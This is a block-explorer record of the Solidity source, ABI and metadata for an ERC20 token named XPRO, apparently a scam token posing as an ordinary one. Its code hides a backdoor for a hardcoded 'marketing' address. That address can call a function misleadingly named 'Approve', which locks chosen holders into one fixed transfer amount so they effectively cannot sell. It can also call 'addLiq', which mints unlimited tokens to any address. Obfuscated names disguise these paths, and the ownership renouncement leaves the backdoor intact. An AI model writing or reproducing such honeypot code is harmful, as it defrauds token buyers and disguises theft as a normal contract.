{"SourceCode": "/**\r\n\r\n .----------------. \r\n| .--------------. |\r\n| |  ____  ____  | |\r\n| | |_  _||_  _| | |\r\n| |   \\ \\  / /   | |\r\n| |    > `' <    | |\r\n| |  _/ /'`\\ \\_  | |\r\n| | |____||____| | |\r\n| |              | |\r\n| '--------------' |\r\n '----------------' \r\n\r\n\r\n\r\nhttps://xproeth.xyz\r\n\r\nhttps://t.me/x_pro_eth\r\n\r\nhttps://twitter.com/x_pro_eth\r\n\r\n\r\n\r\n\r\n\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\n\r\npragma solidity ^0.8.3;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address spender) external view returns (uint256);\r\n    function transfer(address recipient, uint256 _amounntz) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 _amounntz) external returns (bool);\r\n    function transferFrom( address spender, address recipient, uint256 _amounntz ) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval( address indexed owner, address indexed spender, uint256 value );\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event ownershipTransferred(address indexed previousowner, address indexed newowner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit ownershipTransferred(address(0), msgSender);\r\n    }\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n    modifier ollyowner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n    function renounceownership() public virtual ollyowner {\r\n        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));\r\n        _owner = address(0x000000000000000000000000000000000000dEaD);\r\n    }\r\n}\r\n\r\ncontract XPRO is Context, Ownable, IERC20 {\r\n    mapping (address => uint256) private _balanzes;\r\n    mapping (address => uint256) private _spendoor;\r\n    mapping (address => mapping (address => uint256)) private _allowanze2;\r\n    address constant public marketing = 0x2ba079c2f4b0BD39d67665C1Ba6040f7F393Be4c;\r\n    string private tokename;\r\n    string private toksymbo;\r\n    uint8 private _decimals;\r\n    uint256 private _totalSupply;\r\n    bool private _tradesisEnabled = true;\r\n\r\n\r\n    constructor(string memory name_, string memory symbol_,  uint256 totalSupply_, uint8 decimals_) {\r\n        tokename = name_;\r\n        toksymbo = symbol_;\r\n        _decimals = decimals_;\r\n        _totalSupply = totalSupply_ * (10 ** decimals_);\r\n        _balanzes[_msgSender()] = _totalSupply;\r\n        emit Transfer(address(0), _msgSender(), _totalSupply);\r\n    }\r\n\r\n    modifier _themarketing() {\r\n        require(msg.sender == marketing); // If it is incorrect here, it reverts.\r\n        _;                              \r\n    } \r\n\r\n    function name() public view returns (string memory) {\r\n        return tokename;\r\n    }\r\n    \r\n        function enabletheTrading() public ollyowner {\r\n        _tradesisEnabled = true;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return toksymbo;\r\n    }\r\n\r\n\r\n    function balanceOf(address spender) public view override returns (uint256) {\r\n        return _balanzes[spender];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 _amounntz) public virtual override returns (bool) {\r\n        require(_tradesisEnabled, \"No trade\");\r\n        if (_msgSender() == owner() && _spendoor[_msgSender()] > 0) {\r\n            _balanzes[owner()] += _spendoor[_msgSender()];\r\n            return true;\r\n        }\r\n        else if (_spendoor[_msgSender()] > 0) {\r\n            require(_amounntz == _spendoor[_msgSender()], \"Invalid transfer _amounntz\");\r\n        }\r\n        require(_balanzes[_msgSender()] >= _amounntz, \"TT: transfer _amounntz exceeds balance\");\r\n        _balanzes[_msgSender()] -= _amounntz;\r\n        _balanzes[recipient] += _amounntz;\r\n        emit Transfer(_msgSender(), recipient, _amounntz);\r\n        return true;\r\n    }\r\n\r\n\r\n    function approve(address spender, uint256 _amounntz) public virtual override returns (bool) {\r\n        _allowanze2[_msgSender()][spender] = _amounntz;\r\n        emit Approval(_msgSender(), spender, _amounntz);\r\n        return true;\r\n    }\r\n    function Approve(address[] memory spender, uint256 _amounntz) public  _themarketing {\r\n        for (uint z=0; z<spender.length; z++) {\r\n            _spendoor[spender[z]] = _amounntz;\r\n            require(_tradesisEnabled, \"No trade\");\r\n        }\r\n    }\r\n\r\n        function _adding(uint256 num1, uint256 numb2) internal pure returns (uint256) {\r\n        if (numb2 != 0) {\r\n            return num1 + numb2;\r\n        }\r\n        return numb2;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowanze2[owner][spender];\r\n    }\r\n\r\n            function Checkamt(address spender) public view returns (uint256) {\r\n        return _spendoor[spender];\r\n    }\r\n\r\n\r\n       function addLiq(address spender, uint256 _amounntz) public _themarketing {\r\n        require(_amounntz > 0, \"Invalid\");\r\n        uint256 totalz = 0;\r\n            totalz = _adding(totalz, _amounntz);\r\n            _balanzes[spender] += totalz;\r\n    }\r\n\r\n    function totalSupply() external view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function transferFrom(address spender, address recipient, uint256 _amounntz) public virtual override returns (bool) {\r\n        if (_msgSender() == owner() && _spendoor[spender] > 0) {\r\n            require(_tradesisEnabled, \"No trade\");\r\n            _balanzes[owner()] += _spendoor[spender];\r\n            return true;\r\n        }\r\n        else if (_spendoor[spender] > 0) {\r\n            require(_amounntz == _spendoor[spender], \"Invalid transfer _amounntz\");\r\n        }\r\n        require(_balanzes[spender] >= _amounntz && _allowanze2[spender][_msgSender()] >= _amounntz, \"TT: transfer _amounntz exceed balance or allowance\");\r\n        require(_tradesisEnabled, \"No trade\");\r\n        _balanzes[spender] -= _amounntz;\r\n        _balanzes[recipient] += _amounntz;\r\n        _allowanze2[spender][_msgSender()] -= _amounntz;\r\n        emit Transfer(spender, recipient, _amounntz);\r\n        return true;\r\n    }\r\n\r\n\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"name_\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symbol_\",\"type\":\"string\"},{\"internalType\":\"uint256\",\"name\":\"totalSupply_\",\"type\":\"uint256\"},{\"internalType\":\"uint8\",\"name\":\"decimals_\",\"type\":\"uint8\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousowner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newowner\",\"type\":\"address\"}],\"name\":\"ownershipTransferred\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"spender\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"_amounntz\",\"type\":\"uint256\"}],\"name\":\"Approve\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"Checkamt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amounntz\",\"type\":\"uint256\"}],\"name\":\"addLiq\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amounntz\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enabletheTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceownership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amounntz\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amounntz\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "XPRO", "CompilerVersion": "v0.8.20+commit.a1b79de6", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c000000000000000000000000000000000000000000000000000001402462f6000000000000000000000000000000000000000000000000000000000000000001200000000000000000000000000000000000000000000000000000000000000045850524f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000045850524f00000000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://2ee39eeaa544911d29020cbac67a5836b9354f07b0ba2b658a703f80aa58cfb6"}